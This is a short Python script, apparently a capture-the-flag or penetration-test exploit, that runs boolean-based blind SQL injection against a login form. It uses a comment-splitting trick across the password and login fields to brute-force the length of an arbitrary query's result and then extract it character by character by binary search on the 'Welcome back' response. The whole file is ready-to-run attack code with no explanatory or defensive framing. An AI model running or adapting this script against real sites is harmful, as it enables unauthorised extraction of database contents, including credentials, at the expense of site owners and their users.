#!/usr/bin/python

import requests
import sys

url = sys.argv[1]
password = sys.argv[2]
sql = raw_input('query: ') if len(sys.argv)<4 else sys.argv[3]

POST = {
    'password': password
}

# PASSWORD = ...'/*....
# LOGIN = */ OR id=1 AND <blind> -- 

# BF len
print '[-] BFing length'
l = 0
while True:
    POST['login'] = '*/ OR id=1 AND LENGTH((%s))=%d -- ' % (sql, l)
    r = requests.post(url, data = POST)
    if 'Welcome back' in r.content:
        break
    else:
        l += 1

print '[+] Length is %d' % l

s = ''
for i in range(l):
    a = 0
    b = 256

    while b-a>1:
        m = (a+b)/2

        POST['login'] = '*/ OR id=1 AND SUBSTR((%s), %d, 1) < CHAR(%d) -- ' % (sql, i+1, m)

        r = requests.post(url, data = POST)
        if 'Welcome back' in r.content:
            a, b = a, m
        else:
            a, b = m, b

    c = chr(a)
    s += c
    sys.stdout.write(c)
    sys.stdout.flush()

print ''
print s
